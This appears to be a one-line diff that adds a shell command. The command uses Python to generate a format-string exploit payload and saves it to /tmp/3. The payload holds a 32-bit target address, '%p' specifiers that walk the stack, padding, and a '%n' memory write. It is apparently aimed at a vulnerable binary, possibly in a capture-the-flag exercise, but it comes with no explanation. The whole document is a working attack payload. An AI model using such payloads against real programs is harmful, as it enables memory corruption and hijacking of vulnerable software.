@@ -1,0 +1,1 @@
+python -c "print '\x8c\x98\x04\x08' + '%p--'*3 + 'a'*29 + '%n'" > /tmp/3
